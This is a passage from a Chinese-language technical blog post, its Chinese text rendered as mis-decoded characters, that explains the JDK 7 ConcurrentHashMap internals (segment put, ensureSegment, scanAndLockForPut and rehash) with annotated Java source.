å€¼ï¼Œæ±‚åº”è¯¥æ”¾ç½®çš„æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (tab.length - <span class="number">1</span>) &amp; hash;</span><br><span class="line">        <span class="comment">// first æ˜¯æ•°ç»„è¯¥ä½ç½®å¤„çš„é“¾è¡¨çš„è¡¨å¤´</span></span><br><span class="line">        HashEntry&lt;K,V&gt; first = entryAt(tab, index);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ä¸‹é¢è¿™ä¸² for å¾ªç¯è™½ç„¶å¾ˆé•¿ï¼Œä¸è¿‡ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæƒ³æƒ³è¯¥ä½ç½®æ²¡æœ‰ä»»ä½•å…ƒç´ å’Œå·²ç»å­˜åœ¨ä¸€ä¸ªé“¾è¡¨è¿™ä¸¤ç§æƒ…å†µ</span></span><br><span class="line">        <span class="keyword">for</span> (HashEntry&lt;K,V&gt; e = first;;) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">                K k;</span><br><span class="line">                <span class="keyword">if</span> ((k = e.key) == key ||</span><br><span class="line">                    (e.hash == hash &amp;&amp; key.equals(k))) &#123;</span><br><span class="line">                    oldValue = e.value;</span><br><span class="line">                    <span class="keyword">if</span> (!onlyIfAbsent) &#123;</span><br><span class="line">                        <span class="comment">// è¦†ç›–æ—§å€¼</span></span><br><span class="line">                        e.value = value;</span><br><span class="line">                        ++modCount;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ç»§ç»­é¡ºç€é“¾è¡¨èµ°</span></span><br><span class="line">                e = e.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// node åˆ°åº•æ˜¯ä¸æ˜¯ nullï¼Œè¿™ä¸ªè¦çœ‹è·å–é”çš„è¿‡ç¨‹ï¼Œä¸è¿‡å’Œè¿™é‡Œéƒ½æ²¡æœ‰å…³ç³»ã€‚</span></span><br><span class="line">                <span class="comment">// å¦‚æœä¸ä¸º nullï¼Œé‚£å°±ç›´æ¥å°†å®ƒè®¾ç½®ä¸ºé“¾è¡¨è¡¨å¤´ï¼›å¦‚æœæ˜¯nullï¼Œåˆå§‹åŒ–å¹¶è®¾ç½®ä¸ºé“¾è¡¨è¡¨å¤´ã€‚</span></span><br><span class="line">                <span class="keyword">if</span> (node != <span class="literal">null</span>)</span><br><span class="line">                    node.setNext(first);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    node = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(hash, key, value, first);</span><br><span class="line">                </span><br><span class="line">                <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> count + <span class="number">1</span>;</span><br><span class="line">                <span class="comment">// å¦‚æœè¶…è¿‡äº†è¯¥ segment çš„é˜ˆå€¼ï¼Œè¿™ä¸ª segment éœ€è¦æ‰©å®¹</span></span><br><span class="line">                <span class="keyword">if</span> (c &gt; threshold &amp;&amp; tab.length &lt; MAXIMUM_CAPACITY)</span><br><span class="line">                    rehash(node); <span class="comment">// æ‰©å®¹åé¢ä¹Ÿä¼šå…·ä½“åˆ†æ</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// æ²¡æœ‰è¾¾åˆ°é˜ˆå€¼ï¼Œå°† node æ”¾åˆ°æ•°ç»„ tab çš„ index ä½ç½®ï¼Œ</span></span><br><span class="line">                    <span class="comment">// å…¶å®å°±æ˜¯å°†æ–°çš„èŠ‚ç‚¹è®¾ç½®æˆåŸé“¾è¡¨çš„è¡¨å¤´</span></span><br><span class="line">                    setEntryAt(tab, index, node);</span><br><span class="line">                ++modCount;</span><br><span class="line">                count = c;</span><br><span class="line">                oldValue = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// è§£é”</span></span><br><span class="line">        unlock();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•´ä½“æµç¨‹è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œç”±äºæœ‰ç‹¬å é”çš„ä¿æŠ¤ï¼Œæ‰€ä»¥ segment å†…éƒ¨çš„æ“ä½œå¹¶ä¸å¤æ‚ã€‚è‡³äºè¿™é‡Œé¢çš„å¹¶å‘é—®é¢˜ï¼Œæˆ‘ä»¬ç¨åå†è¿›è¡Œä»‹ç»ã€‚</p><p>åˆ°è¿™é‡Œ put æ“ä½œå°±ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¯´ä¸€è¯´å…¶ä¸­å‡ æ­¥å…³é”®çš„æ“ä½œã€‚</p><h4><span id="åˆå§‹åŒ–æ§½-ensuresegment">åˆå§‹åŒ–æ§½: ensureSegment</span></h4><p>ConcurrentHashMap åˆå§‹åŒ–çš„æ—¶å€™ä¼šåˆå§‹åŒ–ç¬¬ä¸€ä¸ªæ§½ segment[0]ï¼Œå¯¹äºå…¶ä»–æ§½æ¥è¯´ï¼Œåœ¨æ’å…¥ç¬¬ä¸€ä¸ªå€¼çš„æ—¶å€™è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>è¿™é‡Œéœ€è¦è€ƒè™‘å¹¶å‘ï¼Œå› ä¸ºå¾ˆå¯èƒ½ä¼šæœ‰å¤šä¸ªçº¿ç¨‹åŒæ—¶è¿›æ¥åˆå§‹åŒ–åŒä¸€ä¸ªæ§½ segment[k]ï¼Œä¸è¿‡åªè¦æœ‰ä¸€ä¸ªæˆåŠŸäº†å°±å¯ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Segment&lt;K,V&gt; <span class="title function_">ensureSegment</span><span class="params">(<span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> Segment&lt;K,V&gt;[] ss = <span class="built_in">this</span>.segments;</span><br><span class="line">    <span class="type">long</span> <span class="variable">u</span> <span class="operator">=</span> (k &lt;&lt; SSHIFT) + SBASE; <span class="comment">// raw offset</span></span><br><span class="line">    Segment&lt;K,V&gt; seg;</span><br><span class="line">    <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u)) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œçœ‹åˆ°ä¸ºä»€ä¹ˆä¹‹å‰è¦åˆå§‹åŒ– segment[0] äº†ï¼Œ</span></span><br><span class="line">        <span class="comment">// ä½¿ç”¨å½“å‰ segment[0] å¤„çš„æ•°ç»„é•¿åº¦å’Œè´Ÿè½½å› å­æ¥åˆå§‹åŒ– segment[k]</span></span><br><span class="line">        <span class="comment">// ä¸ºä»€ä¹ˆè¦ç”¨â€œå½“å‰â€ï¼Œå› ä¸º segment[0] å¯èƒ½æ—©å°±æ‰©å®¹è¿‡äº†</span></span><br><span class="line">        Segment&lt;K,V&gt; proto = ss[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> proto.table.length;</span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> proto.loadFactor;</span><br><span class="line">        <span class="type">int</span> <span class="variable">threshold</span> <span class="operator">=</span> (<span class="type">int</span>)(cap * lf);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆå§‹åŒ– segment[k] å†…éƒ¨çš„æ•°ç»„</span></span><br><span class="line">        HashEntry&lt;K,V&gt;[] tab = (HashEntry&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">HashEntry</span>[cap];</span><br><span class="line">        <span class="keyword">if</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">            == <span class="literal">null</span>) &#123; <span class="comment">// å†æ¬¡æ£€æŸ¥ä¸€éè¯¥æ§½æ˜¯å¦è¢«å…¶ä»–çº¿ç¨‹åˆå§‹åŒ–äº†ã€‚</span></span><br><span class="line">          </span><br><span class="line">            Segment&lt;K,V&gt; s = <span class="keyword">new</span> <span class="title class_">Segment</span>&lt;K,V&gt;(lf, threshold, tab);</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ while å¾ªç¯ï¼Œå†…éƒ¨ç”¨ CASï¼Œå½“å‰çº¿ç¨‹æˆåŠŸè®¾å€¼æˆ–å…¶ä»–çº¿ç¨‹æˆåŠŸè®¾å€¼åï¼Œé€€å‡º</span></span><br><span class="line">            <span class="keyword">while</span> ((seg = (Segment&lt;K,V&gt;)UNSAFE.getObjectVolatile(ss, u))</span><br><span class="line">                   == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (UNSAFE.compareAndSwapObject(ss, u, <span class="literal">null</span>, seg = s))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> seg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´ï¼ŒensureSegment(int k) æ¯”è¾ƒç®€å•ï¼Œå¯¹äºå¹¶å‘æ“ä½œä½¿ç”¨ CAS è¿›è¡Œæ§åˆ¶ã€‚</p><blockquote><p>æˆ‘æ²¡ææ‡‚è¿™é‡Œä¸ºä»€ä¹ˆè¦æä¸€ä¸ª while å¾ªç¯ï¼ŒCAS å¤±è´¥ä¸å°±ä»£è¡¨æœ‰å…¶ä»–çº¿ç¨‹æˆåŠŸäº†å—ï¼Œä¸ºä»€ä¹ˆè¦å†è¿›è¡Œåˆ¤æ–­ï¼Ÿ</p><p>æ„Ÿè°¢è¯„è®ºåŒºçš„<strong>æå­æœ¨</strong>ï¼Œå¦‚æœå½“å‰çº¿ç¨‹ CAS å¤±è´¥ï¼Œè¿™é‡Œçš„ while å¾ªç¯æ˜¯ä¸ºäº†å°† seg èµ‹å€¼è¿”å›ã€‚</p></blockquote><h4><span id="è·å–å†™å…¥é”-scanandlockforput">è·å–å†™å…¥é”: scanAndLockForPut</span></h4><p>å‰é¢æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨å¾€æŸä¸ª segment ä¸­ put çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šè°ƒç”¨  node &#x3D; tryLock() ? null : scanAndLockForPut(key, hash, value)ï¼Œä¹Ÿå°±æ˜¯è¯´å…ˆè¿›è¡Œä¸€æ¬¡ tryLock() å¿«é€Ÿè·å–è¯¥ segment çš„ç‹¬å é”ï¼Œå¦‚æœå¤±è´¥ï¼Œé‚£ä¹ˆè¿›å…¥åˆ° scanAndLockForPut è¿™ä¸ªæ–¹æ³•æ¥è·å–é”ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬æ¥å…·ä½“åˆ†æè¿™ä¸ªæ–¹æ³•ä¸­æ˜¯æ€ä¹ˆæ§åˆ¶åŠ é”çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> HashEntry&lt;K,V&gt; <span class="title function_">scanAndLockForPut</span><span class="params">(K key, <span class="type">int</span> hash, V value)</span> &#123;</span><br><span class="line">    HashEntry&lt;K,V&gt; first = entryForHash(<span class="built_in">this</span>, hash);</span><br><span class="line">    HashEntry&lt;K,V&gt; e = first;</span><br><span class="line">    HashEntry&lt;K,V&gt; node = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">retries</span> <span class="operator">=</span> -<span class="number">1</span>; <span class="comment">// negative while locating node</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¾ªç¯è·å–é”</span></span><br><span class="line">    <span class="keyword">while</span> (!tryLock()) &#123;</span><br><span class="line">        HashEntry&lt;K,V&gt; f; <span class="comment">// to recheck first below</span></span><br><span class="line">        <span class="keyword">if</span> (retries &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="comment">// speculatively create node</span></span><br><span class="line">                    <span class="comment">// è¿›åˆ°è¿™é‡Œè¯´æ˜æ•°ç»„è¯¥ä½ç½®çš„é“¾è¡¨æ˜¯ç©ºçš„ï¼Œæ²¡æœ‰ä»»ä½•å…ƒç´ </span></span><br><span class="line">                    <span class="comment">// å½“ç„¶ï¼Œè¿›åˆ°è¿™é‡Œçš„å¦ä¸€ä¸ªåŸå› æ˜¯ tryLock() å¤±è´¥ï¼Œæ‰€ä»¥è¯¥æ§½å­˜åœ¨å¹¶å‘ï¼Œä¸ä¸€å®šæ˜¯è¯¥ä½ç½®</span></span><br><span class="line">                    node = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (key.equals(e.key))</span><br><span class="line">                retries = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="comment">// é¡ºç€é“¾è¡¨å¾€ä¸‹èµ°</span></span><br><span class="line">                e = e.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é‡è¯•æ¬¡æ•°å¦‚æœè¶…è¿‡ MAX_SCAN_RETRIESï¼ˆå•æ ¸1å¤šæ ¸64ï¼‰ï¼Œé‚£ä¹ˆä¸æŠ¢äº†ï¼Œè¿›å…¥åˆ°é˜»å¡é˜Ÿåˆ—ç­‰å¾…é”</span></span><br><span class="line">        <span class="comment">//    lock() æ˜¯é˜»å¡æ–¹æ³•ï¼Œç›´åˆ°è·å–é”åè¿”å›</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (++retries &gt; MAX_SCAN_RETRIES) &#123;</span><br><span class="line">            lock();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((retries &amp; <span class="number">1</span>) == <span class="number">0</span> &amp;&amp;</span><br><span class="line">                 <span class="comment">// è¿™ä¸ªæ—¶å€™æ˜¯æœ‰å¤§é—®é¢˜äº†ï¼Œé‚£å°±æ˜¯æœ‰æ–°çš„å…ƒç´ è¿›åˆ°äº†é“¾è¡¨ï¼Œæˆä¸ºäº†æ–°çš„è¡¨å¤´</span></span><br><span class="line">                 <span class="comment">//     æ‰€ä»¥è¿™è¾¹çš„ç­–ç•¥æ˜¯ï¼Œç›¸å½“äºé‡æ–°èµ°ä¸€éè¿™ä¸ª scanAndLockForPut æ–¹æ³•</span></span><br><span class="line">                 (f = entryForHash(<span class="built_in">this</span>, hash)) != first) &#123;</span><br><span class="line">            e = first = f; <span class="comment">// re-traverse if entry changed</span></span><br><span class="line">            retries = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ–¹æ³•æœ‰ä¸¤ä¸ªå‡ºå£ï¼Œä¸€ä¸ªæ˜¯ tryLock() æˆåŠŸäº†ï¼Œå¾ªç¯ç»ˆæ­¢ï¼Œå¦ä¸€ä¸ªå°±æ˜¯é‡è¯•æ¬¡æ•°è¶…è¿‡äº† MAX_SCAN_RETRIESï¼Œè¿›åˆ° lock() æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¼šé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°æˆåŠŸæ‹¿åˆ°ç‹¬å é”ã€‚</p><p>è¿™ä¸ªæ–¹æ³•å°±æ˜¯çœ‹ä¼¼å¤æ‚ï¼Œä½†æ˜¯å…¶å®å°±æ˜¯åšäº†ä¸€ä»¶äº‹ï¼Œé‚£å°±æ˜¯<strong>è·å–è¯¥ segment çš„ç‹¬å é”</strong>ï¼Œå¦‚æœéœ€è¦çš„è¯é¡ºä¾¿å®ä¾‹åŒ–äº†ä¸€ä¸‹ nodeã€‚</p><h4><span id="æ‰©å®¹-rehash">æ‰©å®¹: rehash</span></h4><p>é‡å¤ä¸€ä¸‹ï¼Œsegment æ•°ç»„ä¸èƒ½æ‰©å®¹ï¼Œæ‰©å®¹æ˜¯ segment æ•°ç»„æŸä¸ªä½ç½®å†…éƒ¨çš„æ•°ç»„ HashEntry&lt;K,V&gt;[] è¿›è¡Œæ‰©å®¹ï¼Œæ‰©å®¹åï¼Œå®¹é‡ä¸ºåŸæ¥çš„ 2 å€ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å›é¡¾ä¸€ä¸‹è§¦å‘æ‰©å®¹çš„åœ°æ–¹ï¼Œput çš„æ—¶å€™ï¼Œå¦‚æœåˆ¤æ–­è¯¥å€¼çš„æ’å…¥ä¼šå¯¼è‡´è¯¥ segment çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡é˜ˆå€¼ï¼Œé‚£ä¹ˆå…ˆè¿›è¡Œæ‰©å®¹ï¼Œå†æ’å€¼ï¼Œè¯»è€…è¿™ä¸ªæ—¶å€™å¯ä»¥å›å» put æ–¹æ³•çœ‹ä¸€çœ¼ã€‚</p><p>è¯¥æ–¹æ³•ä¸éœ€è¦è€ƒè™‘å¹¶å‘ï¼Œå› ä¸ºåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œæ˜¯æŒæœ‰è¯¥ segment çš„ç‹¬å é”çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ–¹æ³•å‚æ•°ä¸Šçš„ node æ˜¯è¿™æ¬¡æ‰©å®¹åï¼Œéœ€è¦æ·»åŠ åˆ°æ–°çš„æ•°ç»„ä¸­çš„æ•°æ®ã€‚</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rehash</span><span class="params">(HashEntry&lt;K,V&gt; node)</span> &#123;</span><br><span class="line">    HashEntry&lt;K,V&gt;[] oldTable = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">oldCapacity</span> <span class="operator">=</span> oldTable.length;</span><br><span class="line">    <span class="comment">// 2 å€</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">newCapacity</span> <span class="operator">=</span> oldCapacity &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    threshold = (<span class="type">int</span>)(newCapacity * loadFactor);</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ–°æ•°ç»„</span></span><br><span class="line">    HashEntry&lt;K,V&gt;[] newTable =</span><br><span class="line">        (HashEntry&lt;K,V&gt;[]) <span class="keyword">new</span> <span class="title class_">HashEntry</span>[newCapacity];</span><br><span class="line">    <span class="comment">// æ–°çš„æ©ç ï¼Œå¦‚ä» 16 æ‰©å®¹åˆ° 32ï¼Œé‚£ä¹ˆ sizeMask ä¸º 31ï¼Œå¯¹åº”äºŒè¿›åˆ¶ â€˜000...00011111â€™</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sizeMask</span> <span class="operator">=</span> newCapacity - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// éå†åŸæ•°ç»„ï¼Œè€å¥—è·¯ï¼Œå°†åŸæ•°ç»„ä½ç½® i å¤„çš„é“¾è¡¨æ‹†åˆ†åˆ° æ–°æ•°ç»„ä½ç½® i å’Œ i+oldCap ä¸¤ä¸ªä½ç½®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; oldCapacity ; i++) &#123;</span><br><span class="line">        <span class="comment">// e æ˜¯é“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">        HashEntry&lt;K,V&gt; e = oldTable[i];</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="literal">null</span>) &#123;</span><br><span class="line">            HashEntry&lt;K,V&gt; next = e.next;</span><br><span class="line">            <span class="comment">// è®¡ç®—åº”è¯¥æ”¾ç½®åœ¨æ–°æ•°ç»„ä¸­çš„ä½ç½®ï¼Œ</span></span><br><span class="line">            <span class="comment">// å‡è®¾åŸæ•°ç»„é•¿åº¦ä¸º 16ï¼Œe åœ¨ oldTable[3] å¤„ï¼Œé‚£ä¹ˆ idx åªå¯èƒ½æ˜¯ 3 æˆ–è€…æ˜¯ 3 + 16 = 19</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> e.hash &amp; sizeMask;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="literal">null</span>)   <span class="comment">// è¯¥ä½ç½®å¤„åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œé‚£æ¯”è¾ƒå¥½åŠ</span></span><br><span class="line">                newTable[idx] = e;</span><br><span class="line">            <span class="keyword">else</span> &#123; <span class="comment">// Reuse consecutive sequence at same slot</span></span><br><span class="line">                <span class="comment">// e æ˜¯é“¾è¡¨è¡¨å¤´</span></span><br><span class="line">                HashEntry&lt;K,V&gt; lastRun = e;</span><br><span class="line">                <span class="comment">// idx æ˜¯å½“å‰é“¾è¡¨çš„å¤´ç»“ç‚¹ e çš„æ–°ä½ç½®</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">lastIdx</span> <span class="operator">=</span> idx;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// ä¸‹é¢è¿™ä¸ª for å¾ªç¯ä¼šæ‰¾åˆ°ä¸€ä¸ª lastRun èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¹‹åçš„æ‰€æœ‰å…ƒç´ æ˜¯å°†è¦æ”¾åˆ°ä¸€èµ·çš„</span></span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; last = next;</span><br><span class="line">                     last != <span class="literal">null</span>;</span><br><span class="line">                     last = last.next) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> last.hash &amp; sizeMask;</span><br><span class="line">                    <span class="keyword">if</span> (k != lastIdx) &#123;</span><br><span class="line">                        lastIdx = k;</span><br><span class="line">                        lastRun = last;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å°† lastRun åŠå…¶ä¹‹åçš„æ‰€æœ‰èŠ‚ç‚¹ç»„æˆçš„è¿™ä¸ªé“¾è¡¨æ”¾åˆ° lastIdx è¿™ä¸ªä½ç½®</span></span><br><span class="line">                newTable[lastIdx] = lastRun;</span><br><span class="line">                <span class="comment">// ä¸‹é¢çš„æ“ä½œæ˜¯å¤„ç† lastRun ä¹‹å‰çš„èŠ‚ç‚¹ï¼Œ</span></span><br><span class="line">                <span class="comment">//    è¿™äº›èŠ‚ç‚¹å¯èƒ½åˆ†é…åœ¨å¦ä¸€ä¸ªé“¾è¡¨ä¸­ï¼Œä¹Ÿå¯èƒ½åˆ†é…åˆ°ä¸Šé¢çš„é‚£ä¸ªé“¾è¡¨ä¸­</span></span><br><span class="line">                <span class="keyword">for</span> (HashEntry&lt;K,V&gt; p = e; p != lastRun; p = p.next) &#123;</span><br><span class="line">                    <span class="type">V</span> <span class="variable">v</span> <span class="operator">=</span> p.value;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> p.hash;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> h &amp; sizeMask;</span><br><span class="line">                    HashEntry&lt;K,V&gt; n = newTable[k];</span><br><span class="line">                    newTable[k] = <span class="keyword">new</span> <span class="title class_">HashEntry</span>&lt;K,V&gt;(h, p.key, v, n);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†æ–°æ¥çš„ node æ”¾åˆ°æ–°æ•°ç»„ä¸­åˆšåˆšçš„ ä¸¤ä¸ªé“¾è¡¨ä¹‹ä¸€ çš„ å¤´éƒ¨</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">nodeIndex</span> <span class="operator">=</span> node.hash &amp; sizeMask; <span class="comment">// add the new node</span></span><br><span class="line">    node.setNext(newTable[nodeIndex]);</span><br><span class="line">    newTable[nodeIndex] = node;</span><br><span class="line">    table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ‰©å®¹æ¯”ä¹‹å‰çš„ HashMap è¦å¤æ‚ä¸€äº›ï¼Œä»£ç éš¾æ‡‚ä¸€ç‚¹ã€‚ä¸Šé¢æœ‰ä¸¤ä¸ªæŒ¨ç€çš„ for å¾ªç¯ï¼Œç¬¬ä¸€ä¸ª for æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><p>ä»”ç»†ä¸€çœ‹å‘ç°ï¼Œå¦‚æœæ²¡æœ‰ç¬¬ä¸€ä¸ª for å¾ªç¯ï¼Œä¹Ÿæ˜¯å¯ä»¥å·¥ä½œçš„ï¼Œä½†æ˜¯ï¼Œè¿™ä¸ª for å¾ªç¯ä¸‹æ¥ï¼Œå¦‚æœ lastRun çš„åé¢è¿˜æœ‰æ¯”è¾ƒå¤šçš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆè¿™æ¬¡å°±æ˜¯å€¼å¾—çš„ã€‚å› ä¸ºæˆ‘ä»¬åªéœ€è¦å…‹éš† lastRun å‰é¢çš„èŠ‚ç‚¹ï¼Œåé¢çš„ä¸€ä¸²èŠ‚ç‚¹è·Ÿç€ lastRun èµ°å°±æ˜¯äº†ï¼Œä¸éœ€è¦åšä»»ä½•æ“ä½œã€‚</p><p>æˆ‘è§‰å¾— Doug Lea çš„è¿™ä¸ªæƒ³æ³•ä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ï¼Œä¸è¿‡æ¯”è¾ƒåçš„æƒ…å†µå°±æ˜¯æ¯æ¬¡ lastRun éƒ½æ˜¯é“¾è¡¨çš„æœ€åä¸€ä¸ªå…ƒç´ æˆ–è€…å¾ˆé åçš„å…ƒç´ ï¼Œé‚£ä¹ˆè¿™æ¬¡éå†å°±æœ‰ç‚¹æµªè´¹äº†ã€‚<strong>ä¸è¿‡ Doug Lea ä¹Ÿè¯´äº†ï¼Œæ ¹æ®ç»Ÿè®¡ï¼Œå¦‚æœä½¿ç”¨é»˜è®¤çš„é˜ˆå€¼ï¼Œå¤§çº¦åªæœ‰ 1&#x2F;6 